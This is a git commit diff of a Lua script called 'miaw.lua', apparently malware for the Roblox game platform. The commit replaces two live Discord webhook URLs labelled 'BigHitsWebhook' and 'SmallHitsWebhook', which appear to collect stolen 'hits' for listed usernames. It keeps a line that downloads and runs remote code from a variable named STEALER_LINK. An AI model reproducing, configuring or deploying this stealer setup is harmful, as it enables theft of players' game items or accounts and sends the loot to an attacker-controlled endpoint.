e6cd33f6712fa49df2d511a70fce68904b4158bc
no <mys4exz4@gmail.com>
2025-04-17 16:47:54 +0700

    Update miaw.lua

--- miaw.lua
+++ miaw.lua
@@ -5,7 +5,7 @@ Usernames = {
     'zain_fatir'
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1361339623258718228/8eMLiikY6VRUNgWQ__IZt6jx1iFltfpbOARM6Sb_L241p-EtIoLRCtnlwrMtrq-qe4na"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1361339543327871016/Iz2gOmvG1NP5kOIUMQuq5jknbxLPcGTfpIVqE2iceqyCm4kFNimda3uzaIVPTNapZ77I"
+BigHitsWebhook = "https://discord.com/api/webhooks/1362363876695343114/A44hg0xe5865krMxhp5PDoGVHZ1TJDNqfe2C_P85JOoqdfM0Mn3to7xDBxTSgIn-CRV3"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1362363672630001788/azsU0s6Gi6gCERhOwT-QZ2XYKMCdQjLz_itx586sINSI_fBzzZqyvF5RoF7zezotwRvt"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
